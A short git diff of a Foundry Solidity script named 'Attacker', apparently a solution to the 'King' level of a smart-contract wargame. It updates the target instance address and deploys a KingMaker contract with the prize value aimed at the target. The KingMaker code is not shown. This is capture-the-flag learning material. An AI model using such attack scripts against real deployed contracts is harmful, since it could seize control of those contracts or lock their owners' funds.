@@ -6,12 +6,12 @@ import "../instances/Ilevel09.sol";
 import "../src/level09.sol";
 
 contract Attacker is Script {
-    King level09 = King(payable(0x3d8A1317A91B2b9f53A108E00dA27aa2DacD7d90));
+    King level09 = King(payable(0x9BED8AD934C870b0a0ebbf882349631f19468cB8));
 
     function run() external {
         uint256 prize = level09.prize();
 
         vm.broadcast();
-        (new KingMaker){value: prize}();
+        (new KingMaker){value: prize}(address(level09));
     }
 }
